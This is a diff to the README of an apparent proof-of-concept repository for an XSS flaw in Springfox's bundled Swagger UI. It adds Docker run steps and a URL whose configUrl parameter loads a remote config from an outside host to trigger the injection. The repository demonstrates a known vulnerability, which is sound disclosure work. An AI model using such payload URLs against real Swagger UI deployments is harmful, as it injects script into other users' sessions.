@@ -31,6 +31,12 @@ The vulnerable Swagger UI bundled version is shown at: [https://github.com/sprin
 
 ## Running the PoC
 
+### With docker
+1. Run: `docker build -t springfox-xss .`
+2. Run: `docker run -p 8080:8080 springfox-xss` and wait for the springboot app to spin-up
+3. Navigate to: http://localhost:8080/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json
+
+### Without docker
 Ensure you have JDK 11 available to properly build this.
 
 1. Run: `mvn spring-boot:run`
